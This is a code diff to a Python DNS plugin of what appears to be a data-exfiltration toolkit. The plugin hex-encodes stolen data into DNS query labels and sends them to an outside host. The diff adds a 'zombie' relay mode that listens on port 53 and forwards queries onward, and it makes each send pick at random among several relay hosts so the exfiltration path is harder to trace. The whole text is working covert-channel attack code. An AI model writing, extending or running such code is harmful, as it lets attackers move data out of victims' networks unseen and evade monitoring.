@@ -1,6 +1,7 @@
 from dnslib import DNSRecord
 import socket
 from dpkt import dns
+from random import choice
 
 app_exfiltrate = None
 config = None
@@ -30,11 +31,37 @@ def handle_dns_query(qname):
         # print e
         pass
 
+def relay_dns_query(domain):
+    target = config['target']
+    port = config['port']
+    app_exfiltrate.log_message(
+            'info', "[zombie] [dns] Relaying dns query to {0}".format(target))
+    q = DNSRecord.question(domain)
+    try:
+        q.send(target, port, timeout=0.01)
+    except:
+        pass
+
+def sniff(handler):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    IP = "0.0.0.0"
+    PORT = 53
+    sock.bind((IP, PORT))
+    while True:
+        try:
+            data, addr = sock.recvfrom(65536)
+            query = dns.DNS(data)
+            for qname in query.qd:
+                handler(qname.name + '.')
+        except:
+            sock.shutdown()
+            sock.close()
+
 #Send data over multiple labels (RFC 1034)
 #Max query is 253 characters long (textual representation)
 #Max label length is 63 bytes
 def send(data):
-    target = config['target']
+    targets = config['zombies'] + [config['target']]
     port = config['port']
     jobid = data.split("|!|")[0]
     data = data.encode('hex')
@@ -65,6 +92,8 @@ def send(data):
                 domain += label + '.' + config['key']
         q = DNSRecord.question(domain)
         domain = ""
+        target = choice(targets)
+        print 'sending to ' + str(target)
         try:
             q.send(target, port, timeout=0.01)
         except:
@@ -74,28 +103,16 @@ def send(data):
 def listen():
     app_exfiltrate.log_message(
         'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
-    sniff()
+    sniff(handler=handle_dns_query)
 
-def sniff():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    IP = "0.0.0.0"
-    PORT = 53
-    sock.bind((IP, PORT))
-    while True:
-        try:
-            data, addr = sock.recvfrom(65536)
-            #query = dpkt.dns.DNS(data)
-            query = dns.DNS(data)
-            for qname in query.qd:
-                handle_dns_query(qname.name + '.')
-        except:
-            sock.shutdown()
-            sock.close()
+def zombie():
+     app_exfiltrate.log_message(
+        'info', "[zombie] [dns] Waiting for DNS packets for domain {0}".format(config['key']))
+     sniff(handler=relay_dns_query)
 
 class Plugin:
-
     def __init__(self, app, conf):
         global app_exfiltrate, config
         config = conf
-        app.register_plugin('dns', {'send': send, 'listen': listen})
+        app.register_plugin('dns', {'send': send, 'listen': listen, 'zombie': zombie})
         app_exfiltrate = app
